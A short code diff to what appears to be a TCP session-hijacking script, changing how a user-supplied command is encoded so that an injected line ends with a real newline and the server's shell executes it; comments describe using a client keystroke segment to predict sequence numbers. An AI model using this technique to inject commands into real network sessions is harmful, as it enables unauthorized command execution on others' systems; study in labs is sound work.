@@ -45,7 +45,10 @@ def build_args():
 
 def main():
     a = build_args()
-    cmd = a.command.encode()
+    # The shell passes \n literally inside single quotes (-c 'id\n'), so turn
+    # literal \n \t \r into real control bytes -- otherwise the injected line
+    # has no trailing Enter and the server's shell never runs it.
+    cmd = a.command.replace("\\n", "\n").replace("\\t", "\t").replace("\\r", "\r").encode()
 
     # Freshest, least ambiguous anchor: a client -> server data segment (a
     # keystroke). It gives us the client's exact next sequence number directly.
